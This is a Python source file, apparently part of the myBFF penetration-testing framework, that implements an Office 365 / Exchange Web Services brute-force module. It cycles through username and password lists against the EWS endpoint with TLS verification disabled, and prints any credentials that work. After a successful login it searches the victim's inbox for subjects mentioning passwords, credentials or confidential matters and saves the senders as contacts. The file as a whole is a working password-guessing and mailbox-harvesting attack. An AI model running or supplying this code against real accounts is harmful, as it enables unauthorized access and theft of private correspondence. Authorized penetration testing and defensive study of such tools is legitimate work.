#! /bin/python
# Created by Adam Compton (tatanus)
# Part of myBFF
from core.webModule import webModule
import base64
import httplib
import urllib
import ssl
from lxml import etree
import re

class Office365Brute(webModule):
    def __init__(self, config, display, lock):
        super(Office365Brute, self).__init__(config, display, lock)
        self.fingerprint="Outlook"
        self.response="Success"
    fingerprint = "outlook"
    term = ['credential', 'account', 'password', 'login', 'confidential']
    def somethingCool(self, term, data, config):
        # Parse the result xml
        root = etree.fromstring(data)
        xpathStr = "/s:Envelope/s:Body/m:FindItemResponse/m:ResponseMessages/m:FindItemResponseMessage/m:RootFolder/t" \
                   ":Items/t:Message"
        namespaces = {
            's': 'http://schemas.xmlsoap.org/soap/envelope/',
            't': 'http://schemas.microsoft.com/exchange/services/2006/types',
            'm': 'http://schemas.microsoft.com/exchange/services/2006/messages',
        }

        contacts = []
        # Print Mail properties
        print("[+]  Searching for sensitive emails...")
        elements = root.xpath(xpathStr, namespaces=namespaces)
        for element in elements:
            try:
                subject = element.find('{http://schemas.microsoft.com/exchange/services/2006/types}Subject').text
                fromname = element.find(
                    '{http://schemas.microsoft.com/exchange/services/2006/types}From/{'
                    'http://schemas.microsoft.com/exchange/services/2006/types}Mailbox/{'
                    'http://schemas.microsoft.com/exchange/services/2006/types}Name').text
#                fromemail = element.find(
#                    '{http://schemas.microsoft.com/exchange/services/2006/types}From/{'
#                    'http://schemas.microsoft.com/exchange/services/2006/types}Mailbox/{'
#                    'http://schemas.microsoft.com/exchange/services/2006/types}EmailAddress').text
                itemid = element.find('{http://schemas.microsoft.com/exchange/services/2006/types}ItemId').attrib['Id']
                changekey = element.find('{http://schemas.microsoft.com/exchange/services/2006/types}ItemId').attrib[
                    'ChangeKey']
                contacts.append(fromname.encode('ascii', 'ignore')) #+ " (" + fromemail.encode('ascii', 'ignore') + ")")
                for search_term in term:
                    if re.search(search_term, subject, re.IGNORECASE):
                        print "[+] This could be interesting: "
                        print "[+]       * Subject : " + subject.encode('ascii', 'ignore')
                        print "[+]       * From : " + fromname.encode('ascii', 'ignore') #+ " (" + fromemail.encode('ascii',
                                                                                                         #'ignore') + ")"
            except:
                pass
        print("[+]  Any contacts found will be saved to tmp/contacts-" + config["USERNAME"] + "...")
        try:
            for contact in sorted(set(contacts)):
                #print("[+]  Contact Name:  " + contact)
                f = open('./tmp/contacts-' + config["USERNAME"] + '.txt', 'a')
                f.write(contact + '\n')
                f.close()
        except:
            print("[-]  No contacts found in mailbox.")
    def buildConn(self, request, user, password, host, url, context):
        # Build authentication string, remove newline for using it in a http header
        auth = base64.encodestring("%s:%s" % (user, password)).replace('\n', '')
        if 'https' in host:
            host = host.strip('https://')
        else:
            host = host.strip('http://')
        if '/' in host:
            host = re.sub(r'/s\w+', '', host)
        conn = httplib.HTTPSConnection(host, context=context)
        conn.request("POST", url, body=request, headers={
            "Host": host,
            "Content-Type": "text/xml; charset=UTF-8",
            "Content-Length": len(request),
            "Authorization": "Basic %s" % auth
        })
        # Read the webservice response
        resp = conn.getresponse()
        status = resp.status
        data = resp.read()
        conn.close()
        return (status, data)

    def connectTest(self, config, payload):
        url = config["HOST"] + "/ews/Exchange.asmx"
        request = """<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types">
  <soap:Body>
    <FindItem xmlns="http://schemas.microsoft.com/exchange/services/2006/messages"
               xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
              Traversal="Shallow">
      <ItemShape>
        <t:BaseShape>Default</t:BaseShape>
      </ItemShape>
      <ParentFolderIds>
        <t:DistinguishedFolderId Id="inbox"/>
      </ParentFolderIds>
    </FindItem>
  </soap:Body>
</soap:Envelope>""".format()
        context = None
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
        except:
            context = None
            pass
        if config["domain"]:
            user = config["domain"] + '\\' + config["USERNAME"]
        else:
            user = config["USERNAME"]
        (status, data) = self.buildConn(request, user, config["PASSWORD"], config["HOST"], url, context)
        if (int(status) == 200):
            print("[+]  User Credentials Successful: " + user + ":" + config["PASSWORD"])
            if not config["dry_run"]:
                print("[!] Time to do something cool!")
                self.somethingCool(self.term, data, config)
        else:
            print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])

    def payload(self, config):
        if config["PASS_FILE"]:
            pass_lines = [pass_line.rstrip('\n') for pass_line in open(config["PASS_FILE"])]
            for pass_line in pass_lines:
                if config["UserFile"]:
                    lines = [line.rstrip('\n') for line in open(config["UserFile"])]
                    for line in lines:
                        config["USERNAME"] = line.strip('\n')
                        config["PASSWORD"] = pass_line.strip('\n')
                        payload = {
                            'username': config["USERNAME"],
                            'password': config["PASSWORD"]
                            }
                        self.connectTest(config, payload)
                else:
                    config["PASSWORD"] = pass_line.strip('\n')
                    payload = {
                        'username': config["USERNAME"],
                        'password': config["PASSWORD"]
                        }
                    self.connectTest(config, payload)
        elif config["UserFile"]:
            lines = [line.rstrip('\n') for line in open(config["UserFile"])]
            for line in lines:
                config["USERNAME"] = line.strip('\n')
                payload = {
                    'username': config["USERNAME"],
                    'password': config["PASSWORD"]
                    }
                self.connectTest(config, payload)
        else:
            payload = {
                'username': config["USERNAME"],
                'password': config["PASSWORD"]
            }
            self.connectTest(config, payload)
